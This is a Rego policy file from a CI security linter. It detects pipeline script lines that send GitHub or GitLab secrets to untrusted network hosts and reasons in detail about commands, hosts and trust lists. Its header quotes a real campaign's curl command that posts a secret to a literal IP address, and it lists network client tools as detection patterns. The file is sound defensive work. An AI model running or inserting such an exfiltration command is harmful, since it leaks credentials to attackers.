# secret-egress: flag a script line that sends a secret over the network to
# a host the policy does not trust. The GhostAction campaigns (2025, 2026)
# injected workflows whose single step did exactly this:
#
#   curl -s -X POST -d 'VPS_HOST=${{ secrets.VPS_HOST }}' http://193.32.204.199
#
# Three things must meet in ONE command of a line (see _segments): a
# network client, a secret and a literal destination nobody trusts. A destination that is a variable
# ($WEBHOOK_URL) is not judged: the rule cannot know the host and must not
# guess, so such a line is silent by design. A script entry can hold a whole
# multi-line `run: |` block, so entries are split into physical lines first.
#
# Secrets. GitHub: `${{ secrets.NAME }}` on the line, or a reference to an
# env key bound to one (job.variables already merges workflow, job and step
# `env:`). GitLab: a reference to a settings variable the variables lane
# reports as masked, or to a predefined token; without that lane
# (settingsVariablesKnown false) the rule abstains and StatusFor reports
# not_evaluable.
#
# Destinations. Every http(s)://host[:port] literal (a bracketed IPv6 host
# included), every bare IPv4 and every schemeless host on the raw line,
# minus a trailing unquoted shell comment. A schemeless host is a dotted
# name whose last label is alphabetic, taken when it carries a path or a
# port (`host/x`, `host:8443`) or, on a line with no URL or IP destination,
# when it is the first positional argument of a client (`nc host 4444`,
# `curl -s host`, past value-taking flags and their values); a bare dotted word
# elsewhere (`-o out.txt`) is a file name, not a host. Trusted when a
# trustedHosts glob matches host[:port] (a numeric pattern such as 10.*
# matches IPv4 literals only, an IPv6-shaped one such as 2606:4700:* or
# [2606:4700::1] IPv6 literals only), or, with trustVcsHosts, when the host matches
# one of the provider's vcsHosts patterns (projected by
# buildEngineConfigForRun). An IP literal is trusted only through
# trustedHosts. Loopback and single-label service aliases are never
# destinations (QUESTIONS row 425).
#
# A line whose first non-blank character is `#` is a shell comment and is
# dropped before anything is read, and before continuations are joined: a
# disabled command sends nothing, and a `#` line ending in a backslash does
# not hide the live line under it.
#
# The client is read on the comment-stripped line; the secret and the
# destination on the raw line, because the secret usually sits inside the
# quotes the stripper removes. The client regex is a double-quoted string
# so its left boundary can hold a backtick (`curl ...` substitution). Identity keys on the destination host: the
# secret names and the line are data, so a second secret or a reworded
# command does not re-key the finding.
package secret_egress

import rego.v1

_client_words := `curl|wget|nc|ncat|netcat|invoke-webrequest|invoke-restmethod|iwr|irm|http|https`

# What may sit right before a client word: a path (`/usr/bin/curl`,
# `./curl`, `C:\tools\curl.exe`) and a backslash (`\curl`, the alias
# bypass). Only a whole word after the last separator: `mycurl` and
# `curlx` are not curl. The path is a drive letter, a leading separator
# and non-empty segments with no `:`, so a URL ending in a client word
# (`https://charts.example/wget`) is never a path.
_client_path := concat("", [`(?:[A-Za-z]:)?[/\\]?(?:[^\s;&|(`, _bt, `"':/\\]+[/\\])*\\?`])

_client := concat("", [`(?i)(^|[\s;&|(`, _bt, `]|\$\()`, _client_path, `(`, _client_words, `)(?:\.exe)?\s`])

# A client word quoted at command position (`"curl" -d ...`): unquoted
# before the quote stripping in _visible_line, which would hide it.
_quoted_client := concat("", [`(?i)^(\s*)["'](`, _client_path, `(?:`, _client_words, `)(?:\.exe)?)["'](\s)`])

# The host of an http(s) URL, capture group 1. Userinfo (`user:pass@`,
# including a `${{ secrets.X }}` or `$VAR` in it) is skipped up to the LAST
# @ before the path, the way a URL parser reads it, so
# `https://u:p@ss@evil.example` and `https://x@api.github.com@evil.example`
# both go to evil.example. A host never ends on a dot. A bracketed IPv6
# literal (`http://[2606:4700::1111]:8080/`) is a host too.
_url_host := `(?i)https?://(?:(?:[^/?#\s"']|\$\{\{[^}]*\}\})*@)?(\[[0-9a-f:.]+\](?::[0-9]{1,5})?|[a-z0-9](?:[a-z0-9.-]*[a-z0-9])?(?::[0-9]{1,5})?)`

# A bare IPv4[:port], capture group 2. Bounded on both sides so a version
# in a path (`/releases/1.2.3.4/`, `pkg-3.19.1.2.tgz`) and a hostname that
# starts with an IP (`1.2.3.4.nip.io`) are not destinations; `/` stays
# allowed on the right so a schemeless `curl 1.2.3.4/x` is.
_bare_ip := `(^|[^0-9A-Za-z./_-])((?:[0-9]{1,3}\.){3}[0-9]{1,3}(?::[0-9]{1,5})?)([^0-9A-Za-z._-]|$)`

# A schemeless token, whole: a dotted hostname whose last label is
# alphabetic (2+ chars), an optional port (group 2) and an optional path
# (group 3). Tokens are cut on whitespace and quotes, so a host glued to
# `=`, `@`, `.`, `/` or `://` is never a token start.
_schemeless := `(?i)^([a-z0-9](?:[a-z0-9-]*[a-z0-9])?(?:\.[a-z0-9](?:[a-z0-9-]*[a-z0-9])?)*\.[a-z]{2,})(:[0-9]{1,5})?(/.*)?$`

# A token that is a client word, possibly opened by `$(`, `(`, a backtick
# or a command separator, and by a path or a backslash (_client_path). A
# Windows `.exe` suffix (curl.exe) is the same client.
_client_token := concat("", [`(?i)^(?:.*[;&|(`, _bt, `])?`, _client_path, `(`, _client_words, `)(?:\.exe)?$`])

_predefined_gitlab_tokens := {"CI_JOB_TOKEN", "CI_REGISTRY_PASSWORD", "CI_DEPLOY_PASSWORD", "CI_DEPENDENCY_PROXY_PASSWORD"}

deny contains finding if {
	input.config.secretEgress
	_provider_ready
	some i
	job := input.pipeline.jobs[i]
	some dest in _untrusted_destinations(job)
	names := _secrets_sent_to(job, dest)
	count(names) > 0
	line := _first_line_to(job, dest)
	finding := {
		"code": "ISSUE-311",
		"severity": "critical",
		"message": _message(job.name, names, dest),
		"job": job.name,
		"destination": dest,
		"secretNames": sort(names),
		"scriptLine": trim_space(line),
		"file": object.get(job, "originFile", ""),
		"line": object.get(job, "originLine", 0),
	}
}

# GitHub needs nothing collected; GitLab needs the variables lane.
_provider_ready if input.pipeline.provider == "github"

_provider_ready if {
	input.pipeline.provider == "gitlab"
	input.pipeline.settingsVariablesKnown == true
}

# ---- per-line analysis -------------------------------------------------

# Physical lines, after joining backslash-newline continuations so a
# command split over several lines is read as the one line the shell runs.
# Comment lines go first: a comment ends at the newline even when it ends
# in a backslash, so `# old \` must not swallow the live line under it.
_lines(job) := {line |
	some script in object.get(job, "scripts", [])
	kept := [raw | some raw in split(script, "\n"); not startswith(trim_left(raw, " \t"), "#")]
	joined := regex.replace(concat("\n", kept), `\\\r?\n[ \t]*`, " ")
	some line in split(joined, "\n")
}

# Egress is read per command, not per line: `curl https://x | sh && npm
# publish --token $T` sends T to no curl destination. Each entry is
# [line, dest, carried]: the physical line (reported as scriptLine), an
# untrusted destination named by the client's own command, and the text
# whose secrets reach that destination. A `$(...)` or backtick
# substitution is a command scope of its own (_scopes).
_egress_lines(job) := _client_egress(job) | _git_egress(job)

# A network client: the carried text is its command plus the commands
# piped into it, with the substitutions it holds put back (their output is
# part of the arguments it sends).
_client_egress(job) := {[line, dest, flow] |
	some line in _lines(job)
	some scope in _scopes(line)
	some seg in _segments(scope.text)
	regex.match(_client, _visible_line(seg.text))
	flow := strings.replace_n(scope.subs, seg.flow)
	count(_secrets_on_line(job, flow)) > 0
	some dest in _destinations(seg.text)
	not _local(dest)
	not _trusted(dest)
}

# git is a client only for what it sends to a remote: a secret in the
# userinfo of an http(s) remote URL (`https://user:$TOKEN@host/r.git`) goes
# to that URL's host, and a secret in a `-c http.[<url>.]extraheader=`
# value goes to every remote URL of the command. A secret anywhere else on
# a git command is not sent.
_git_client := concat("", [`(?i)(^|[\s;&|(`, _bt, `]|\$\()`, _client_path, `git(?:\.exe)?\s`])

_git_url := `(?i)https?://(?:((?:[^/?#\s"']|\$\{\{[^}]*\}\})*)@)?(\[[0-9a-f:.]+\](?::[0-9]{1,5})?|[a-z0-9](?:[a-z0-9.-]*[a-z0-9])?(?::[0-9]{1,5})?)`

_git_egress(job) := {[line, dest, carried] |
	some line in _lines(job)
	some scope in _scopes(line)
	some seg in _segments(scope.text)
	regex.match(_git_client, _visible_line(seg.text))
	headers := concat(" ", _git_headers(seg.text))
	some m in regex.find_all_string_submatch_n(_git_url, seg.text, -1)
	carried := strings.replace_n(scope.subs, concat(" ", [m[1], headers]))
	count(_secrets_on_line(job, carried)) > 0
	dest := lower(m[2])
	not _local(dest)
	not _trusted(dest)
}

# The values of `-c http.extraheader=...` and `-c http.<url>.extraheader=...`,
# whether the whole `-c` argument is quoted or only its value.
_git_headers(text) := quoted | bare if {
	quoted := {m[1] | some m in regex.find_all_string_submatch_n(`(?i)["']http\.[^=\s"']*extraheader=([^"']*)["']`, text, -1)}
	bare := {m[1] | some m in regex.find_all_string_submatch_n(`(?i)(?:^|\s)http\.[^=\s"']*extraheader=("[^"]*"|'[^']*'|[^\s"']+)`, text, -1)}
}

# ---- substitution scopes ---------------------------------------------------

# A `$(...)` (one nesting level) or backtick substitution runs as its own
# command, quoted or not (a single-quoted string holds none). Each scope is
# {text, subs}: the text with every substitution it holds replaced by a
# placeholder word, so its client, destinations and command split are read
# on its own text, and subs, mapping each placeholder back to the
# substitution, so the secrets a substitution feeds into the command still
# count. The scopes are the line and its substitutions, two levels deep.
_subst_re := concat("|", [
	`'[^']*'`,
	`\$\{\{.*?\}\}`,
	`\$\((?:[^()]|\([^()]*\))*\)`,
	concat("", [_bt, "[^", _bt, "]*", _bt]),
])

_scope(text) := {"text": strings.replace_n(to, text), "subs": back, "inners": inners} if {
	keys := sort({m | some m in regex.find_n(_subst_re, text, -1); _is_subst(m)})
	to := {k: sprintf("__subst%d__", [i]) | some i, k in keys}
	back := {sprintf("__subst%d__", [i]): k | some i, k in keys}
	inners := [_inner(k) | some k in keys]
}

_is_subst(m) if startswith(m, "$(")

_is_subst(m) if startswith(m, _bt)

_inner(m) := substring(m, 2, count(m) - 3) if startswith(m, "$(")

_inner(m) := substring(m, 1, count(m) - 2) if startswith(m, _bt)

_scopes(line) := array.concat(array.concat([top], first), second) if {
	top := _scope(line)
	first := [_scope(t) | some t in top.inners]
	second := [_scope(t) | some sc in first; some t in sc.inners]
}

_untrusted_destinations(job) := {e[1] | some e in _egress_lines(job)}

_secrets_sent_to(job, dest) := {name |
	some e in _egress_lines(job)
	e[1] == dest
	some name in _secrets_on_line(job, e[2])
}

_first_line_to(job, dest) := line if {
	lines := sort([e[0] | some e in _egress_lines(job); e[1] == dest])
	line := lines[0]
}

# ---- command segments ------------------------------------------------------

# A best-effort shell split. A line is cut into pieces: a GitHub
# expression, a quoted string, a `$(...)` (one nesting level) or a
# backtick substitution stays whole, a redirect such as `2>&1` or `&>` is
# not a separator, and `&&`, `||`, `;`, `&` and `|` are. The pieces
# between two separators are one command; a command after `|` belongs to
# the same pipeline as the one before it, so a secret echoed into a pipe
# flows to the client reading it. `&&`, `||`, `;` and `&` cut that flow.
_bt := "`"

_piece := concat("|", [
	`\$\{\{.*?\}\}`,
	`"(?:[^"\\]|\\.)*"`,
	`'[^']*'`,
	`\$\((?:[^()]|\([^()]*\))*\)`,
	concat("", [_bt, "[^", _bt, "]*", _bt]),
	`[0-9]*[<>]+&[0-9-]*`,
	`&>>?`,
	`&&`,
	`\|\|`,
	`[;&|]`,
	concat("", [`[^"'$&|;<>`, _bt, "]+"]),
	`.`,
])

_separators := {"&&", "||", ";", "&", "|"}

_segments(line) := segs if {
	code := regex.replace(line, `\s+#[^"']*$`, "")
	pieces := regex.find_n(_piece, code, -1)
	seps := [k | some k, p in pieces; p in _separators]
	bounds := array.concat(array.concat([-1], seps), [count(pieces)])
	texts := [concat("", array.slice(pieces, bounds[n] + 1, bounds[n + 1])) | some n in numbers.range(0, count(bounds) - 2)]
	piped := {n | some n, _ in texts; n > 0; pieces[bounds[n]] == "|"}
	segs := [{"text": texts[n], "flow": concat(" | ", array.slice(texts, _pipeline_start(n, piped), n + 1))} | some n, _ in texts]
}

# The first command of the pipeline command n belongs to.
_pipeline_start(n, piped) := max({m | some m in numbers.range(0, n); not piped[m]})

_visible_line(line) := stripped if {
	bare := regex.replace(line, _quoted_client, "${1}${2}${3}")
	once := regex.replace(bare, `"[^"]*"`, "")
	twice := regex.replace(once, `'[^']*'`, "")
	stripped := regex.replace(twice, `\s+#.*`, "")
}

# ---- destinations --------------------------------------------------------

# A trailing unquoted shell comment is cut first: a URL in
# `# see https://docs...` sends nothing. URL, IP and shaped hosts are then
# read on the command minus its side arguments (_destination_text).
_destinations(line) := (literal | _shaped_hosts(kept)) | _positional_hosts(code, literal) if {
	code := regex.replace(line, `\s+#[^"']*$`, "")
	kept := _destination_text(code)
	hosts := {lower(m[1]) | some m in regex.find_all_string_submatch_n(_url_host, kept, -1)}
	ips := {m[2] | some m in regex.find_all_string_submatch_n(_bare_ip, kept, -1)}
	literal := hosts | ips
}

# ---- side arguments --------------------------------------------------------

# Shell words: a `${{ }}` expression or a quoted string never splits one.
_word := `(?:\$\{\{.*?\}\}|"[^"]*"|'[^']*'|[^\s"'])+`

# The command with its side arguments removed. After the client word, a
# flag is assumed to take the next word as its value (the positional
# walk's rule: everything except the client's known value-less flags),
# and a `--flag=value` word carries its own. Such a value is a side
# argument, not where the client connects: a proxy (`-x
# proxy.corp:3128`), a `--resolve host:443:10.0.0.5` map, a header
# (`-H "Host: lb.internal:8443"`). Two exceptions keep the value: a flag
# that names the destination (curl --url, PowerShell -Uri), and an
# http(s) URL or IP literal after any flag but a known side flag (proxy,
# resolve, interface, DNS, referer, header), so an unknown boolean flag
# before the address (`--tr-encoding https://...`, `--http1.1 1.2.3.4`)
# never hides it. Without a client word the text is kept
# whole.
_destination_text(code) := concat(" ", kept) if {
	words := regex.find_n(_word, code, -1)
	c := _client_at(words)
	kept := [w | some k, w in words; not _side_value(words, k, c[0], c[1])]
}

_destination_text(code) := code if {
	words := regex.find_n(_word, code, -1)
	not _client_at(words)
}

_client_at(words) := [i, lower(m[1])] if {
	idx := [i | some i, w in words; regex.match(_client_token, _unquote(w))]
	count(idx) > 0
	i := idx[0]
	m := regex.find_all_string_submatch_n(_client_token, _unquote(words[i]), 1)[0]
}

# A `--flag=value` word, other than --url=.
_side_value(words, k, i, client) if {
	k > i
	w := _unquote(words[k])
	startswith(w, "-")
	contains(w, "=")
	not _url_flag(client, split(w, "=")[0])
}

# The word after a flag that takes a value.
_side_value(words, k, i, client) if {
	k - 1 > i
	prev := _unquote(words[k - 1])
	startswith(prev, "-")
	not contains(prev, "=")
	not _valueless(client, prev)
	not _url_flag(client, prev)
	not _kept_url(client, prev, _unquote(words[k]))
}

# A URL, a bare IPv4 or a bracketed IPv6 value names where the client
# connects unless its flag is a side flag (proxy, resolve, connect-to,
# interface, DNS, referer or header).
_kept_url(client, flag, value) if {
	regex.match(`(?i)^(https?://|\[[0-9a-f:.]+\]|[0-9]{1,3}(\.[0-9]{1,3}){3}(:[0-9]{1,5})?(/|$))`, value)
	not _side_url_flag(client, flag)
}

_side_url_flag("curl", flag) if flag in {
	"-x", "--proxy", "--preproxy", "--socks4", "--socks4a", "--socks5", "--socks5-hostname",
	"--resolve", "--connect-to", "--interface", "--dns-servers", "--dns-ipv4-addr",
	"--dns-ipv6-addr", "--local-port", "-e", "--referer", "--doh-url", "-H", "--header",
}

_side_url_flag("wget", flag) if flag in {"-e", "--bind-address", "--header"}

_side_url_flag(client, flag) if {
	client in {"invoke-webrequest", "invoke-restmethod", "iwr", "irm"}
	lower(flag) in {"-proxy", "-headers"}
}

# Shaped schemeless hosts: a token carrying a path or a port anywhere on
# the line.
_shaped_hosts(code) := {_schemeless_dest(m) |
	some t in regex.split(`[\s"']+`, code)
	t != ""
	some m in regex.find_all_string_submatch_n(_schemeless, t, 1)
	concat("", [m[2], m[3]]) != ""
}

# The positional host: a host-shaped first positional argument of a client
# (`nc host 4444`, `curl -s host`, `nc -w 3 host 4444`, `http POST host`).
# A fallback, read only when the line names no URL or IP destination: a
# download (`curl -o out.txt ... https://...`) always has one, the exfil
# shapes this catches never do. The walk reads shell words (a quoted
# string is one word) and skips flags, the word after any flag not known to
# be value-less, a bare number and an HTTP method word. The value of a flag
# that names the destination (curl --url, PowerShell -Uri) is a candidate
# too, wherever it sits.
_positional_hosts(_, literal) := set() if count(literal) > 0

_positional_hosts(code, literal) := first | flagged if {
	count(literal) == 0
	words := [_unquote(w) | some w in regex.find_n(`(?:"[^"]*"|'[^']*'|[^\s"'])+`, code, -1)]
	first := {_schemeless_dest(m) |
		some i, w in words
		some c in regex.find_all_string_submatch_n(_client_token, w, 1)
		client := lower(c[1])
		args := {j | some j, a in words; j > i; not _skipped_word(words, i, j, client)}
		count(args) > 0
		some m in regex.find_all_string_submatch_n(_schemeless, words[min(args)], 1)
	}
	flagged := {_schemeless_dest(m) |
		some i, w in words
		some c in regex.find_all_string_submatch_n(_client_token, w, 1)
		some j, flag in words
		j > i
		j + 1 < count(words)
		_url_flag(lower(c[1]), flag)
		some m in regex.find_all_string_submatch_n(_schemeless, words[j + 1], 1)
	}
}

_url_flag("curl", "--url")

_url_flag(client, flag) if {
	client in {"invoke-webrequest", "invoke-restmethod", "iwr", "irm"}
	lower(flag) == "-uri"
}

_unquote(w) := replace(replace(w, `"`, ""), "'", "")

_skipped_word(words, _, j, _) if startswith(words[j], "-")

_skipped_word(words, _, j, _) if regex.match(`^[0-9]+$`, words[j])

_skipped_word(words, _, j, _) if regex.match(`(?i)^(GET|POST|PUT|PATCH|DELETE|HEAD|OPTIONS)$`, words[j])

# A flag is assumed to take a value, so the word after it is skipped too,
# unless the client's value-less list names it: an unknown flag
# (`--cert client.pem`, `-D headers.txt`) never leaks its file name as the
# host. A `--flag=value` word carries its own value.
_skipped_word(words, i, j, client) if {
	j - 1 > i
	prev := words[j - 1]
	startswith(prev, "-")
	not contains(prev, "=")
	not _valueless(client, prev)
}

_valueless_flags := {
	"curl": {
		"-s", "-S", "-f", "-L", "-k", "-v", "-i", "-I", "-g", "-q", "-4", "-6", "-N",
		"--silent", "--show-error", "--fail", "--location", "--insecure", "--verbose",
		"--include", "--head", "--compressed", "--retry-all-errors", "--no-progress-meter",
	},
	"wget": {
		"-q", "-v", "-nv", "-c", "-N", "-r", "-np", "-nc", "-b", "-S",
		"--quiet", "--verbose", "--no-verbose", "--continue", "--no-clobber",
		"--no-check-certificate", "--spider",
	},
	"nc": {"-v", "-z", "-u", "-l", "-n", "-k", "-4", "-6"},
	"ncat": {"-v", "-z", "-u", "-l", "-n", "-k", "-4", "-6"},
	"netcat": {"-v", "-z", "-u", "-l", "-n", "-k", "-4", "-6"},
	"http": {
		"-v", "-b", "-h", "-j", "-f", "-F", "-d", "-S",
		"--verbose", "--body", "--headers", "--json", "--form", "--follow",
		"--download", "--stream", "--check-status", "--offline", "--ignore-stdin",
	},
	"https": {
		"-v", "-b", "-h", "-j", "-f", "-F", "-d", "-S",
		"--verbose", "--body", "--headers", "--json", "--form", "--follow",
		"--download", "--stream", "--check-status", "--offline", "--ignore-stdin",
	},
}

# PowerShell parameters are case-insensitive and never bundled.
_powershell_valueless := {"-usebasicparsing", "-skipcertificatecheck", "-passthru", "-verbose"}

_valueless(client, flag) if flag in object.get(_valueless_flags, client, set())

# A bundle of short flags (`-sSfL`) is value-less when every letter is.
_valueless(client, flag) if {
	regex.match(`^-[A-Za-z0-9]{2,}$`, flag)
	not startswith(flag, "--")
	every ch in split(substring(flag, 1, -1), "") {
		concat("", ["-", ch]) in object.get(_valueless_flags, client, set())
	}
}

_valueless(client, flag) if {
	client in {"invoke-webrequest", "invoke-restmethod", "iwr", "irm"}
	lower(flag) in _powershell_valueless
}

_schemeless_dest(m) := lower(concat("", [m[1], m[2]]))

_ip_literal := `^[0-9]{1,3}(\.[0-9]{1,3}){3}(:[0-9]{1,5})?$`

# A pattern whose first label is numeric (10.*, 192.168.*) names IP
# literals only: glob.match lets `*` cross dots, so without this 10.* would
# trust 10.attacker.example, a name anyone can register.
_trusted(dest) if {
	some pattern in object.get(input.config.secretEgress, "trustedHosts", [])
	not _ipv6_pattern(lower(pattern))
	_pattern_applies(lower(pattern), dest)
	glob.match(lower(pattern), null, dest)
}

# An IPv6-shaped pattern (`2606:4700::1111`, `[2606:4700::1111]`,
# `2606:4700:*`: hex digits, colons, dots and glob stars only, with `::` or
# at least two colons) names bracketed IPv6 literals only. Both sides are
# matched without their brackets, so a glob never reads `[...]` as a
# character class; the destination keeps its bracketed form for display.
_ipv6_pattern(pattern) if {
	bare := _unbracket(pattern)
	regex.match(`^[0-9a-f:.*?]+$`, bare)
	count(split(bare, ":")) > 2
}

_trusted(dest) if {
	startswith(dest, "[")
	some pattern in object.get(input.config.secretEgress, "trustedHosts", [])
	_ipv6_pattern(lower(pattern))
	glob.match(_unbracket(lower(pattern)), null, _unbracket(dest))
}

_unbracket(s) := replace(replace(s, "[", ""), "]", "")

# An IP-shaped pattern: its first label is made of digits and glob
# metacharacters only, with at least one digit (10.*, 192.168.*, 10.?.0.1).
# A hostname that merely starts with a digit (1password.com) is a hostname.
_ip_pattern := `^[*?\[\]]*[0-9][0-9*?\[\]]*(\.|:|$)`

_pattern_applies(pattern, _) if not regex.match(_ip_pattern, pattern)

_pattern_applies(pattern, dest) if {
	regex.match(_ip_pattern, pattern)
	regex.match(_ip_literal, dest)
}

_trusted(dest) if {
	object.get(input.config.secretEgress, "trustVcsHosts", true) == true
	some pattern in object.get(input.config.secretEgress, "vcsHosts", [])
	glob.match(lower(pattern), null, _host_only(dest))
}

# A VCS host pattern names the host, never a port. A bracketed IPv6 host
# keeps its brackets.
_host_only(dest) := split(dest, ":")[0] if not startswith(dest, "[")

_host_only(dest) := concat("", [split(dest, "]")[0], "]"]) if startswith(dest, "[")

# Loopback and the job's own service containers are not egress: a secret
# handed to a process on the runner or to a `services:` alias stays on the
# runner (QUESTIONS row 425). Built in, not configurable.
_local(dest) if _host_only(dest) == "localhost"

_local(dest) if regex.match(`^127\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}(:[0-9]{1,5})?$`, dest)

_local(dest) if regex.match(`^(::1|\[::1\])(:[0-9]{1,5})?$`, dest)

# A single label with no dot (docker, postgres, redis:6379). A label that
# is all digits or a 0x number is an integer IP literal, never an alias.
_local(dest) if {
	host := _host_only(dest)
	regex.match(`^[a-z0-9-]+$`, host)
	not regex.match(`^([0-9]+|0x[0-9a-f]+)$`, host)
}

# ---- secrets -------------------------------------------------------------

_secrets_on_line(job, line) := interpolated | referenced if {
	interpolated := _interpolated(line)
	referenced := _referenced(job, line)
}

# GitHub: `${{ secrets.NAME }}` written on the line itself. Empty elsewhere.
_interpolated(line) := {name |
	input.pipeline.provider == "github"
	some m in regex.find_all_string_submatch_n(`\$\{\{\s*secrets\.([A-Za-z0-9_]+)\s*\}\}`, line, -1)
	name := m[1]
}

# A reference to a secret-bearing name: $NAME, ${NAME}, %NAME%,
# ${{ env.NAME }}, and PowerShell's $env:NAME, whose name is
# case-insensitive. Names are shell identifiers (filtered below), so they
# are safe to interpolate into a regex.
_referenced(job, line) := {name |
	some name in _secret_names(job)
	regex.match(sprintf(`(\$\{?%s\}?|(?i:\$env:%s)|%%%s%%|\$\{\{\s*env\.%s\s*\}\})([^A-Za-z0-9_]|$)`, [name, name, name, name]), line)
}

_secret_names(job) := names if {
	input.pipeline.provider == "github"
	names := {name |
		some name, value in object.get(job, "variables", {})
		regex.match(`^[A-Za-z_][A-Za-z0-9_]*$`, name)
		regex.match(`\$\{\{\s*secrets\.`, value)
	}
}

_secret_names(_) := names if {
	input.pipeline.provider == "gitlab"
	masked := {v.name |
		some v in object.get(input.pipeline, "settingsVariables", [])
		v.masked == true
		regex.match(`^[A-Za-z_][A-Za-z0-9_]*$`, v.name)
	}
	names := masked | _predefined_gitlab_tokens
}

# ---- message -------------------------------------------------------------

_message(jobName, names, dest) := sprintf("Job `%s` sends the secret `%s` to `%s`.", [jobName, sorted[0], dest]) if {
	sorted := sort(names)
	count(sorted) == 1
}

_message(jobName, names, dest) := sprintf("Job `%s` sends the secrets %s to `%s`.", [jobName, _list(sort(names)), dest]) if {
	count(names) > 1
}

_list(sorted) := concat(" and ", [concat(", ", [sprintf("`%s`", [n]) | some n in array.slice(sorted, 0, count(sorted) - 1)]), sprintf("`%s`", [sorted[count(sorted) - 1]])])
